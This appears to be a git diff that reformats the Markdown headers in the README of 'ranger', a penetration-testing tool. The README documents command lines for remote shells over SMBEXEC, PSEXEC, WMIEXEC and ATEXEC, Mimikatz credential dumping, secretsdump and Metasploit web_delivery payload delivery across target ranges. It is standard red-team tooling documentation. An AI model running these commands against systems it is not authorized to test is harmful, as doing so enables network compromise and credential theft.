@@ -63,82 +63,82 @@ ranger --update
 --find-la-access
 ```
 
-##Command Execution:
-###Find Logged In Users:
+## Command Execution:
+### Find Logged In Users:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout
 ```
-###SMBEXEC Command Shell:
+### SMBEXEC Command Shell:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv
 ```
 
-###PSEXEC Command Shell:
+### PSEXEC Command Shell:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv
 ```
 
-###PSEXEC Command Execution:
+### PSEXEC Command Execution:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv
 ```
 
-###WMIEXEC Command Execution:
+### WMIEXEC Command Execution:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
 ```
 
-###WMIEXEC PowerShell Mimikatz Memory Injector:
+### WMIEXEC PowerShell Mimikatz Memory Injector:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
 ```
 
-###WMIEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
+### WMIEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
 ```
 
-###WMIEXEC Custom Code Memory Injector:
+### WMIEXEC Custom Code Memory Injector:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds"
 ```
 
-###ATEXEC Command Execution:
+### ATEXEC Command Execution:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
 ```
 
-###ATEXEC PowerShell Mimikatz Memory Injector:
+### ATEXEC PowerShell Mimikatz Memory Injector:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
 ```
 
-###ATEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
+### ATEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
 ```
 
-###ATEXEC Custom Code Memory Injector:
+### ATEXEC Custom Code Memory Injector:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds" --no-encoder
 ```
 
-###SECRETSDUMP Custom Code Memory Injector:
+### SECRETSDUMP Custom Code Memory Injector:
 ```
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
 ```
 
-###Create Pasteable Mimikatz Attack:
+### Create Pasteable Mimikatz Attack:
 ```
 ranger.py --invoker -q -v -vv -vvv
 ```
 
-###Create Pasteable web_delivery Attack (requires Metasploit config see below):
+### Create Pasteable web_delivery Attack (requires Metasploit config see below):
 ```
 ranger.py --downloader -q -v -vv -vvv
 ```
 
-###Create Pasteable Executor Attack:
+### Create Pasteable Executor Attack:
 ```
 ranger.py --executor -q -v -vv -vvv
 ```
@@ -150,8 +150,8 @@ ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --domain "Domain.local2"
 ```
 
-##Notes About Usage:
-###Cred File Format:
+## Notes About Usage:
+### Cred File Format:
 * You can pass it a list of usernames and passwords or hashes in the following format in the same file:
 ```
 username password
@@ -168,11 +168,11 @@ PWDUMP domain
 username PWDUMP domain
 ```
 
-###Credential File Caveats:
+### Credential File Caveats:
 * If you provide domain names in the file they will be used instead of the default WORKGROUP.  
 * If you supply the domain name by command line `-d`, it will infer that you want to ignore all the domain names in the file.
 
-###Command Line Execution:
+### Command Line Execution:
 * If you do not want to use the file you can pass the details through command line directly.
 * If you wish to supply hashes instead of passwords just pass them through the password argument.  
 * If they are PWDUMP format and you supply no username it will pull the username out of the hash.  
@@ -184,10 +184,10 @@ LM:NTLM
 :NTLM
 PWDUMP
 ```
-###Targets and Exclusions:
+### Targets and Exclusions:
 * Targets and exclusions can be used at the same time
 
-####Targets, Target Ranges, Target CIDRs, Target Lists, NMAP XML Targets:
+#### Targets, Target Ranges, Target CIDRs, Target Lists, NMAP XML Targets:
 * You can provide a list of targets either by using a target list or through the target option.  
 * You can supply multiple target list files by comma separating them and it will aggregate the data and remove duplicates and then exclude your IP address from the default interface or the interface you provide. 
 * The tool accepts, CIDR notations, small ranges (192.168.195.1-100) or large ranges (192.168.194.1-192.163.1.1) or single IP addresses.  
@@ -196,7 +196,7 @@ PWDUMP
 * The tool will normalize and remove duplicates before targeting boxes
 * EXAMPLE: `-t 192.168.195.1-100,192.168.195.200-192.168.198.3 -tl list1,list2,lis3 -tnX scan1.xml,scan2.xml`
 
-####Exclusions, Exclusion Ranges, Exclusion CIDRs, Exclusion Lists, Nmap XML Exclusions:
+#### Exclusions, Exclusion Ranges, Exclusion CIDRs, Exclusion Lists, Nmap XML Exclusions:
 * You can exclude targets using the exclude arguments as well, so if you do not touch a little Class C out of a Class A it will figure that out for you.
 * Exclusions can be conducted in exactly the same manner as targets, just replace the `t` in the commands with `e`
 * EXAMPLE: `-e 192.168.195.1-100,192.168.195.200-192.168.198.3 -el list1,list2,lis3 -enX scan1.xml,scan2.xml`
@@ -236,17 +236,17 @@ set URIPATH /
 set SRVPORT <the same as what is set by the -r option in ranger, defaults to 8888>
 exploit -j
 ```
-##FAQ
+## FAQ
 
-###Access Deined Errors for SMBEXEC and WMIEXEC
+### Access Deined Errors for SMBEXEC and WMIEXEC
 I'm getting access denied errors in Windows machines that are part of a WORKGROUP.
 
 When not part of a domain, Windows by default does not have any administrative shares.  SMBEXEC relies on shares being enabled.  Additionally, WMIC isn't enabled on WORKGROUP machines.  SMBEXEC and WMIEXEC are made to target protocols enabled on domain systems.  While its certainly possible to enable these functions on a WORKGROUP system, note that you are introducing vulnerable protocols (after all, that's what this tool is made to attack).  Enabling these features on your primary home system that your significant other uses for Facebook as well is probably not the best idea.  
 * Make sure this is a test box you own.  You can force the shares to be enabled by following the instructions here: http://www.wintips.org/how-to-enable-admin-shares-windows-7/
 * If you want to determine what shares are exposed and then target them, you can use a tool like `enum4linux` and then use the `--share share_name` argument in ranger to try and execute SMBEXEC.
 
-##Future Features:
-###Colored Output:
+## Future Features:
+### Colored Output:
 * Continue adding colored output with `https://pypi.python.org/pypi/colorama`
 * WINDOWER – Execute PowerShell without hiding the window to avoid certain monitoring systems
 * GATHERER – Automated credential extractor for a domain group
@@ -254,7 +254,7 @@ When not part of a domain, Windows by default does not have any administrative s
 * Better NTDS and Group Parsing
 * SMB Catapult servers
 
-#Thank You:
+# Thank You:
 * Microsoft for PowerShell (and in advance for bash in Windows!)
 * To the CoreLabs Impacket Team
 * PowerShellEmpire Team
